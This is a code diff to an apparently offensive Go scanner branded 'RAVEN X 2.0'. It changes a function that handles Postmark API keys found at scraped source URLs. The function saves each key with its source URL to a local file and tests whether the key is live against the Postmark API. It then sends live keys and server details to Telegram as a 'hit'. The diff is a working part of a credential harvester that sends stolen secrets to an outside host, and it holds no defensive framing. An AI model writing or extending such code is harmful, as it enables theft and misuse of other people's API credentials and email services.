@@ -23,6 +23,8 @@ func (a *AWSScanner) CheckPostmark(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "postmark_found.txt")
+
 	req, err := http.NewRequest("GET", "https://api.postmarkapp.com/server", nil)
 	if err != nil {
 		return false
@@ -56,14 +58,8 @@ func (a *AWSScanner) CheckPostmark(key, sourceURL string) bool {
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-📧 <b>POSTMARK LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🖥 <b>Server:</b> %s
-🔗 <b>Source:</b> %s
-`, key, serverName, sourceURL)
+	msg := a.tgHit("📧", "POSTMARK", sourceURL) + fmt.Sprintf(
+		"\n🔑 <b>Key:</b> <code>%s</code>\n🖥 <b>Server:</b> %s\n", key, serverName)
 	go a.sendTelegram(msg)
 	return true
 }
